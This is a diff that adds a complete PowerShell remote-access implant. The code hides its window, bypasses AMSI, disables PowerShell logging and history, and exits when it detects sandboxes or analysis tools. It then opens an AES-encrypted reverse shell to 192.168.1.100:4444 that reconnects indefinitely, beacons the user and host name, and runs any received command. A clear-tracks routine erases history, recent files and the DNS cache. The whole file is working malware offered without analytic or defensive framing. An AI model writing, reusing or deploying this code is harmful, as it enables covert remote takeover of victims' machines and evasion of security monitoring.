@@ -1,0 +1,479 @@
+#region Initialization
+function Initialize-Environment {
+    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+    Enable-AdvancedStealth | Out-Null
+    
+    if (Test-SandboxEnvironment) {
+        exit
+    }
+    
+    return $true
+}
+#endregion
+
+#region Advanced Stealth & Evasion
+function Enable-AdvancedStealth {
+    try {
+        Add-Type @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class Stealth {
+            [DllImport("user32.dll")]
+            public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+            [DllImport("kernel32.dll")]
+            public static extern IntPtr GetConsoleWindow();
+            [DllImport("user32.dll")]
+            public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+        }
+"@
+        $consolePtr = [Stealth]::GetConsoleWindow()
+        [Stealth]::ShowWindow($consolePtr, 0) | Out-Null
+        [Stealth]::SetWindowPos($consolePtr, 0, -32000, -32000, 0, 0, 0x0001) | Out-Null
+        
+        $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        if ($amsiContext) {
+            $amsiField = $amsiContext.GetField('amsiInitFailed', 'NonPublic,Static')
+            if ($amsiField) {
+                $amsiField.SetValue($null, $true)
+            }
+        }
+        
+        $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+        if ($settings) {
+            $settings.SetValue($null, @{
+                'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0; 'EnableScriptBlockInvocationLogging' = 0 }
+                'ModuleLogging' = @{ 'EnableModuleLogging' = 0 }
+                'Transcription' = @{ 'EnableTranscripting' = 0 }
+            })
+        }
+        
+        Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
+        
+        $process = Get-Process -Id $PID
+        $process.PriorityClass = 'BelowNormal'
+        
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Clear-Tracks {
+    try {
+        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+        Clear-DnsClientCache -ErrorAction SilentlyContinue
+    }
+    catch {}
+}
+
+function Test-SandboxEnvironment {
+    $indicators = 0
+    
+    $vmIndicators = @(
+        (Get-WmiObject -Class Win32_ComputerSystem).Model -match 'Virtual|VMware|VBox',
+        (Get-WmiObject -Class Win32_BIOS).SerialNumber -match 'VMware|Virtual',
+        (Test-Path 'C:\Program Files\VMware'),
+        (Get-Process | Where-Object { $_.Name -match 'vbox|vmware|vmmouse' })
+    )
+    
+    foreach ($check in $vmIndicators) {
+        if ($check) { $indicators++ }
+    }
+    
+    $analysisTools = @('wireshark', 'fiddler', 'procmon', 'tcpview', 'processhacker')
+    foreach ($tool in $analysisTools) {
+        if (Get-Process -Name $tool -ErrorAction SilentlyContinue) {
+            $indicators++
+        }
+    }
+    
+    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+    if ($uptime.TotalMinutes -lt 10) {
+        $indicators++
+    }
+    
+    $ram = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+    if ($ram -lt 2) {
+        $indicators++
+    }
+    
+    if ($indicators -ge 3) {
+        return $true
+    }
+    
+    return $false
+}
+#endregion
+
+#region AES Encryption Setup
+function Get-AESCrypto {
+    $KeyBytes = 0..15 | ForEach-Object { [byte]$_ }
+    $IVBytes = 16..31 | ForEach-Object { [byte]$_ }
+    
+    return @{
+        Key = $KeyBytes
+        IV = $IVBytes
+    }
+}
+#endregion
+
+#region Custom Padding Functions
+function Add-PKCS7Padding {
+    param([byte[]]$data)
+    
+    $blockSize = 16
+    $padding = $blockSize - ($data.Length % $blockSize)
+    if ($padding -eq 0) {
+        $padding = $blockSize
+    }
+    
+    $padded = New-Object byte[] ($data.Length + $padding)
+    [System.Buffer]::BlockCopy($data, 0, $padded, 0, $data.Length)
+    
+    for ($i = $data.Length; $i -lt $padded.Length; $i++) {
+        $padded[$i] = [byte]$padding
+    }
+    
+    return $padded
+}
+
+function Remove-PKCS7Padding {
+    param([byte[]]$data)
+    
+    $padding = $data[$data.Length - 1]
+    
+    if ($padding -lt 1 -or $padding -gt 16) {
+        throw "Invalid padding value"
+    }
+    
+    for ($i = $data.Length - $padding; $i -lt $data.Length; $i++) {
+        if ($data[$i] -ne $padding) {
+            throw "Invalid padding"
+        }
+    }
+    
+    $unpadded = New-Object byte[] ($data.Length - $padding)
+    [System.Buffer]::BlockCopy($data, 0, $unpadded, 0, $unpadded.Length)
+    
+    return $unpadded
+}
+#endregion
+
+#region AES Encryption/Decryption Functions
+function Encrypt-AES {
+    param(
+        [string]$PlainText,
+        [byte[]]$Key,
+        [byte[]]$IV
+    )
+    
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+    $aes.Key = $Key
+    $aes.IV = $IV
+    
+    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+    $paddedBytes = Add-PKCS7Padding -data $plainBytes
+    
+    $encryptor = $aes.CreateEncryptor()
+    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
+    
+    $aes.Dispose()
+    
+    return $encryptedBytes
+}
+
+function Decrypt-AES {
+    param(
+        [byte[]]$EncryptedBytes,
+        [byte[]]$Key,
+        [byte[]]$IV
+    )
+    
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
+    $aes.Key = $Key
+    $aes.IV = $IV
+    
+    $decryptor = $aes.CreateDecryptor()
+    $decryptedBytes = $decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
+    
+    $unpaddedBytes = Remove-PKCS7Padding -data $decryptedBytes
+    
+    $aes.Dispose()
+    
+    return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
+}
+#endregion
+
+#region Network Functions
+function Connect-ToServer {
+    param(
+        [string]$RemoteHost = "192.168.1.100",
+        [int]$Port = 4444
+    )
+    
+    $maxRetries = 999999
+    $baseDelay = 2
+    $maxDelay = 60
+    
+    for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
+        try {
+            $client = New-Object System.Net.Sockets.TcpClient
+            $client.ReceiveTimeout = 30000
+            $client.SendTimeout = 30000
+            $client.ConnectAsync($RemoteHost, $Port).Wait(5000)
+            
+            if ($client.Connected) {
+                return $client
+            }
+        }
+        catch {}
+        
+        $delay = [Math]::Min($baseDelay * [Math]::Pow(2, [Math]::Min($attempt - 1, 5)), $maxDelay)
+        $jitter = Get-Random -Minimum 0 -Maximum 5
+        $totalDelay = $delay + $jitter
+        
+        Start-Sleep -Seconds $totalDelay
+    }
+    
+    throw "Failed to establish connection"
+}
+
+function Send-EncryptedData {
+    param(
+        [System.Net.Sockets.NetworkStream]$Stream,
+        [string]$Message,
+        [byte[]]$Key,
+        [byte[]]$IV
+    )
+    
+    try {
+        $encryptedBytes = Encrypt-AES -PlainText $Message -Key $Key -IV $IV
+        
+        $lengthBytes = [System.BitConverter]::GetBytes($encryptedBytes.Length)
+        $Stream.Write($lengthBytes, 0, 4)
+        
+        $Stream.Write($encryptedBytes, 0, $encryptedBytes.Length)
+        $Stream.Flush()
+        
+        return $true
+    }
+    catch {
+        return $false
+    }
+}
+
+function Receive-EncryptedData {
+    param(
+        [System.Net.Sockets.NetworkStream]$Stream,
+        [byte[]]$Key,
+        [byte[]]$IV
+    )
+    
+    try {
+        $lengthBytes = New-Object byte[] 4
+        $bytesRead = $Stream.Read($lengthBytes, 0, 4)
+        
+        if ($bytesRead -eq 0) {
+            return $null
+        }
+        
+        $dataLength = [System.BitConverter]::ToInt32($lengthBytes, 0)
+        
+        if ($dataLength -le 0 -or $dataLength -gt 1048576) {
+            throw "Invalid data length: $dataLength"
+        }
+        
+        $encryptedBytes = New-Object byte[] $dataLength
+        $totalRead = 0
+        
+        while ($totalRead -lt $dataLength) {
+            $bytesRead = $Stream.Read($encryptedBytes, $totalRead, ($dataLength - $totalRead))
+            if ($bytesRead -eq 0) {
+                throw "Connection closed during data transfer"
+            }
+            $totalRead += $bytesRead
+        }
+        
+        $decrypted = Decrypt-AES -EncryptedBytes $encryptedBytes -Key $Key -IV $IV
+        
+        return $decrypted
+    }
+    catch {
+        return $null
+    }
+}
+#endregion
+
+#region Command Execution
+function Execute-Command {
+    param([string]$Command)
+    
+    $Command = $Command.Trim()
+    
+    if ($Command -eq "exit") {
+        return "[Session terminated]"
+    }
+    
+    if ($Command -eq "exit_permanent") {
+        Clear-Tracks
+        return "[Permanent exit]"
+    }
+    
+    if ($Command.StartsWith("cd ")) {
+        $path = $Command.Substring(3).Trim()
+        try {
+            if ($path -eq "..") {
+                Set-Location ..
+            }
+            elseif (Test-Path $path) {
+                Set-Location $path
+            }
+            else {
+                return "Error: Path not found: $path"
+            }
+            return "Current directory: $(Get-Location)"
+        }
+        catch {
+            return "Error changing directory: $_"
+        }
+    }
+    
+    if ($Command.ToLower() -eq "clear_tracks") {
+        Clear-Tracks
+        return "Tracks cleared"
+    }
+    
+    if ($Command.ToLower() -eq "check_sandbox") {
+        $isSandbox = Test-SandboxEnvironment
+        return "Sandbox detected: $isSandbox"
+    }
+    
+    try {
+        $ErrorActionPreference = 'SilentlyContinue'
+        
+        $output = Invoke-Expression -Command $Command 2>&1 | Out-String
+        
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            $output = cmd /c $Command 2>&1 | Out-String
+        }
+        
+        $ErrorActionPreference = 'Continue'
+        
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[Command executed - no output]"
+        }
+        
+        return $output.Trim()
+    }
+    catch {
+        return "Error executing command: $_"
+    }
+}
+#endregion
+
+#region Persistent Session Handler
+function Start-PersistentSession {
+    param(
+        [string]$RemoteHost = "192.168.1.100",
+        [int]$Port = 4444,
+        [byte[]]$Key,
+        [byte[]]$IV
+    )
+    
+    $sessionCount = 0
+    
+    while ($true) {
+        $sessionCount++
+        
+        try {
+            $client = Connect-ToServer -RemoteHost $RemoteHost -Port $Port
+            
+            if (-not $client.Connected) {
+                throw "Failed to connect"
+            }
+            
+            $stream = $client.GetStream()
+            
+            $beacon = "PowerShell Shell - User: $($env:USERNAME) - Host: $($env:COMPUTERNAME) - PID: $PID - Session: $sessionCount"
+            $beaconBytes = [System.Text.Encoding]::UTF8.GetBytes($beacon)
+            $stream.Write($beaconBytes, 0, $beaconBytes.Length)
+            $stream.Flush()
+            
+            $exitRequested = $false
+            while ($true) {
+                try {
+                    $command = Receive-EncryptedData -Stream $stream -Key $Key -IV $IV
+                    
+                    if ($null -eq $command) {
+                        break
+                    }
+                    
+                    if ($command.Trim() -eq "exit_permanent") {
+                        $exitRequested = $true
+                        Execute-Command -Command "exit_permanent"
+                        break
+                    }
+                    
+                    $result = Execute-Command -Command $command
+                    
+                    $success = Send-EncryptedData -Stream $stream -Message $result -Key $Key -IV $IV
+                    
+                    if (-not $success) {
+                        break
+                    }
+                    
+                    if ($result -eq "[Session terminated]") {
+                        break
+                    }
+                }
+                catch [System.IO.IOException] {
+                    break
+                }
+                catch {
+                    try {
+                        Send-EncryptedData -Stream $stream -Message "Error: $_" -Key $Key -IV $IV | Out-Null
+                    }
+                    catch {}
+                }
+            }
+            
+            if ($exitRequested) {
+                break
+            }
+        }
+        catch {}
+        finally {
+            if ($stream) {
+                try { $stream.Close() } catch {}
+                try { $stream.Dispose() } catch {}
+            }
+            if ($client) {
+                try { $client.Close() } catch {}
+                try { $client.Dispose() } catch {}
+            }
+        }
+        
+        $reconnectDelay = Get-Random -Minimum 3 -Maximum 10
+        Start-Sleep -Seconds $reconnectDelay
+    }
+}
+#endregion
+
+#region Main Execution
+Initialize-Environment | Out-Null
+
+$crypto = Get-AESCrypto
+$key = $crypto.Key
+$iv = $crypto.IV
+
+try {
+    Start-PersistentSession -RemoteHost "192.168.1.100" -Port 4444 -Key $key -IV $iv
+}
+catch {}
+#endregion
